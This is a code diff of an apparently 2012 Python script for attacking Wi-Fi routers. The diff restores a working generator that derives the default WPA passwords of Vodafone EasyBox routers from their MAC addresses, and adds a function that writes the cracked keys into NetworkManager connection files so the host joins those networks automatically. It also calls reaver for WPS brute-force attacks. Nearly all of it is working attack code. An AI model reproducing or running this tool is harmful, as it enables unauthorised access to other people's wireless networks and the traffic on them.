@@ -8,6 +8,7 @@ import sys
 import pprint
 import time
 import os
+from uuid import uuid4
 
 bus = dbus.SystemBus()
 proxy = bus.get_object("org.freedesktop.NetworkManager", "/org/freedesktop/NetworkManager")
@@ -63,29 +64,28 @@ def scan_bssids():
 
 # generate default key from mac address
 def easy_box_keygen(mac):
-#	bytes = [int(x, 16) for x in mac.split(':')]
+	bytes = [int(x, 16) for x in mac.split(':')]
 
-#	c1 = (bytes[-2] << 8) + bytes[-1]
-#	(s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]
-#	(m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]
+	c1 = (bytes[-2] << 8) + bytes[-1]
+	(s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]
+	(m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]
 
-#	k1 = (s7 + s8 + m11 + m12) & (0x0F)
-#	k2 = (m9 + m10 + s9 + s10) & (0x0F)
+	k1 = (s7 + s8 + m11 + m12) & (0x0F)
+	k2 = (m9 + m10 + s9 + s10) & (0x0F)
 
-#	x1 = k1 ^ s10
-#	x2 = k1 ^ s9
-#	x3 = k1 ^ s8
-#	y1 = k2 ^ m10
-#	y2 = k2 ^ m11
-#	y3 = k2 ^ m12
-#	z1 = m11 ^ s10
-#	z2 = m12 ^ s9
-#	z3 = k1 ^ k2
+	x1 = k1 ^ s10
+	x2 = k1 ^ s9
+	x3 = k1 ^ s8
+	y1 = k2 ^ m10
+	y2 = k2 ^ m11
+	y3 = k2 ^ m12
+	z1 = m11 ^ s10
+	z2 = m12 ^ s9
+	z3 = k1 ^ k2
 
-#	bssid = "EasyBox-%1x%1x%1x%1x%1x%1x" % (m7, m8, m9, m10, s6, s10)
+	bssid = "EasyBox-%1x%1x%1x%1x%1x%1x" % (m7, m8, m9, m10, s6, s10)
 
-#	return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)
-	return "000000000"
+	return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)
 
 def count_easy_boxes():
 	j = 0;
@@ -125,6 +125,28 @@ def crack_easy_boxes():
 			j += 1
         return j;
 
+def nm():
+	j = 0;
+	for i in range(0, len(scanned_ap_details)):
+		tmpstr = (str)(scanned_ap_details[i][1])
+		if tmpstr.find('EasyBox-') == 0:
+			ssid = scanned_ap_details[i][1]
+			bssid = scanned_ap_details[i][2]
+			wpass = easy_box_keygen(bssid)
+			print " adding connection: "+ssid+" "+bssid+" "+wpass
+			config = "[connection]\nid="+ssid+"\nuuid="+(str(uuid4()))+"\ntype=802-11-wireless\nzone=\n\n[802-11-wireless]\nssid="+ssid+"\nmode=infrastructure\n"
+			config = config + "security=802-11-wireless-security\n\n[802-11-wireless-security]\nkey-mgmt=wpa-psk\npsk="+wpass+"\n\n[ipv4]\nmethod=auto\nmay-fail=false\n\n"
+			config = config + "[ipv6]\nmethod=ignore\n\n"
+			print config
+			print " writing this config to /etc/NetworkManager/system-connections/"
+			filename = "/etc/NetworkManager/system-connections/_"+ssid
+			print " filename : "+filename
+			fobj = open(filename, "w")
+			fobj.write(config)
+			fobj.close()
+			j += 1
+	return 0;
+
 def crack_wps(bssid, channel, interface):
 	cmdline = "/usr/bin/reaver -vv -i "+interface+" -c "+(str)(channel)+" -b "+bssid
 	print " > $ "+cmdline
@@ -132,7 +154,7 @@ def crack_wps(bssid, channel, interface):
 	return 0;
        
 if __name__ == "__main__":
-    print "net v034 (c) 2012 Nils Stec"
+    print "net v036 (c) 2012 Nils Stec"
     arguments = len(sys.argv)-1
     arg = 1
     csv_id = 0
@@ -150,6 +172,7 @@ if __name__ == "__main__":
 	    print " some users may think this is overload or anything else - fuck you, this was the simplest way!\n"
 	    print "command line options:\n\
 		--help			\n\
+		--do-nm			\n\
 		--easy-box		- do an easy-box attack on every reachable easybox\n\
 		--easy-box-guess	- guess from mac address which AP is a (renamed) EasyBox\n\
 		--write-csv		- finally all cracked APs will be written to a logfile\n\
@@ -185,6 +208,10 @@ if __name__ == "__main__":
 	    print " > doing a reaver test on bssids"
 	    do_wps = 1
 	    arg += 1
+	elif sys.argv[arg] == "--do-nm":
+		print " > doing nm connections"
+		do_nm = 1
+		arg += 1
 	else:
 	    print "unknown option!\n"
 	    sys.exit(-1)
@@ -230,6 +257,10 @@ if __name__ == "__main__":
 	easy_boxes = count_easy_boxes();
 	print " > starting easy-box-attack on %d networks..." % easy_boxes
 	easy_boxes_cracked = crack_easy_boxes()
+    if do_nm == 1:
+	easy_boxes = count_easy_boxes();
+	print " > starting easy-box-attack on %d networks and adding all found boxes to NM's system connections..." % easy_boxes
+	nm()
     if easy_box_guess == 1:
 	print " > starting easy-box-attack on other networks with arcadyan BSSIDs (guessing easy boxes)..."
 	guess_easy_boxes()
